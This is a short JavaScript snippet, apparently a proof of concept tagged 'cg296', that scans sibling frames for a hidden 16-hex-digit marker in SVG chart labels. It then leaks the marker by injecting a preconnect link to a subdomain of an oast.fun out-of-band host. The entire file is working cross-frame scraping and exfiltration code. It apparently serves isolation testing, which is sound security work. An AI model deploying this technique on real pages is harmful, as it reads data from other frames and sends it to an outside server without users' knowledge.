(() => {
  const output = document.getElementById('cg296-reader-status');
  if (!output) return;

  const started = Date.now();
  const maximumMs = 300000;
  const intervalMs = 500;
  const markerPattern = /^[0-9a-f]{16}$/;
  let finished = false;
  let timer;

  function collect(win, seen, found) {
    if (win === window || seen.has(win)) return;
    seen.add(win);
    try {
      const doc = win.document;
      if (doc !== document) {
        const vis = doc.getElementById('vis');
        if (vis && vis.textContent?.includes('CG296_MEMCHECK')) {
          for (const label of vis.querySelectorAll('svg text')) {
            const value = label.textContent?.trim();
            if (value && markerPattern.test(value)) found.add(value);
          }
        }
      }
    } catch (_) {
      // A cross-origin frame is not a readable target.
    }
    try {
      for (let i = 0; i < win.frames.length; i++) collect(win.frames[i], seen, found);
    } catch (_) {
      // Continue with other sibling frames.
    }
  }

  function visibleMarkers() {
    const found = new Set();
    const seen = new Set();
    try {
      for (let i = 0; i < top.frames.length; i++) collect(top.frames[i], seen, found);
    } catch (_) {
      // A missing host frame leaves no target.
    }
    return found;
  }

  const baseline = visibleMarkers();

  function check() {
    if (finished) return;
    const candidates = [...visibleMarkers()].filter(value => !baseline.has(value));
    if (candidates.length === 1) {
      finished = true;
      clearInterval(timer);
      const marker = candidates[0];
      output.textContent = `VEGA_LABEL_FOUND:${marker}`;
      const hint = document.createElement('link');
      hint.rel = 'preconnect';
      hint.href = `https://cg296-${marker}.topwralyyfzhdmfckdhvbjshr74jjfmyr.oast.fun/`;
      document.head.append(hint);
      const status = document.createElement('pre');
      status.id = 'cg296-hint-status';
      status.textContent = `HINT_INSERTED:${marker}`;
      document.body.append(status);
    } else if (candidates.length > 1) {
      finished = true;
      clearInterval(timer);
      output.textContent = 'AMBIGUOUS_VEGA_LABELS';
    } else if (Date.now() - started >= maximumMs) {
      finished = true;
      clearInterval(timer);
      output.textContent = 'NO_LATER_VEGA_LABEL';
    }
  }

  timer = setInterval(check, intervalMs);
  check();
})();
